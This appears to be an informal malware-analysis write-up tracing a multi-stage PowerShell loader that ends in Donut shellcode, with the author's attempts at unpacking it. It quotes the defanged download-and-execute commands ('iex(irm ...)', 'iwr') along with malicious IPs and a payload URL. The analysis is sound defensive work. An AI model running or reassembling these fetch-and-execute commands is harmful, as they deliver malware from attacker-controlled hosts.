Command ran : 
STEP 1: 

powershell -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing) 
IEX -> Invoke Expression 
IRM -> Invoke Rest Method      
First Step download a second script for [redacted] 

from there the second payload download a third one 
$finalPayload = iwr -Uri "178[.]16[.]53[.]70" -UseBasicParsing 

the third part will download a $u = "hxxp[://]94[.]154[.]35[.]115/user_profiles_photo/cptch[.]bin"
Identified as a DONUT shellcode in 0.9.2 and load it inside a thread for execution 

Reading the source code for DONUT 0.9.2 we can see the first byte any shellcode should be an OPCODE of 0xE8 

For now only UNDONUT work in static but ... for donut 0.9.3 and there was a lot of change in between versions.

SO , since so far my attemps at extracting the payload fail we are now moving any further 

BUT for funsies i've launched it 
Basically create a c# file to compile under %temp% [random_name].cmdline 
then use cvtres& csc.exe to compile it 

then it crash powershell and hide itself to contact a new server but so far i cant find it.

So i have two way from there 
first one , Spend 5 more hours to rebuild a test of a a python script to unpack the shellcode ...
Or make sure that whatever CSC is run with as argument will be dumped
